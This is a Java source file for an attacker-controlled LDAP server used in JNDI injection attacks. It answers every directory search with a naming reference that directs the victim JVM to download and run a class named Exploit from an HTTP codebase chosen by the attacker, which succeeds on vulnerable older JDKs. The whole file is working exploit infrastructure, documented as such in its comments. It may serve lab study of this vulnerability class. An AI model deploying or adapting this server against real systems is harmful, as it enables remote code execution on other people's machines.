import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

/**
 * Attacker-controlled LDAP server. For ANY search it replies with a JNDI
 * "reference" that tells the victim JVM: "the object you want is a Java class
 * named Exploit, downloadable from this HTTP codebase." On vulnerable JDKs
 * (pre-8u191, where trustURLCodebase defaults to true) the victim fetches and
 * executes it. Built on UnboundID's in-memory LDAP server.
 */
public class LDAPRefServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args) throws Exception {
        int port = 1389;
        // codebase = directory URL the victim downloads the class from (must end with /)
        String codebase = args.length > 0 ? args[0] : "http://127.0.0.1:8888/";
        String className = args.length > 1 ? args[1] : "Exploit";

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));
        config.addInMemoryOperationInterceptor(new RefInterceptor(codebase, className));

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("[attacker] LDAP server on 0.0.0.0:" + port
                + " -> references " + className + " at " + codebase);
        ds.startListening();
    }

    private static class RefInterceptor extends InMemoryOperationInterceptor {
        private final String codebase;
        private final String className;

        RefInterceptor(String codebase, String className) {
            this.codebase = codebase;
            this.className = className;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaClassName", className);
                e.addAttribute("javaCodeBase", codebase);
                e.addAttribute("javaFactory", className);
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
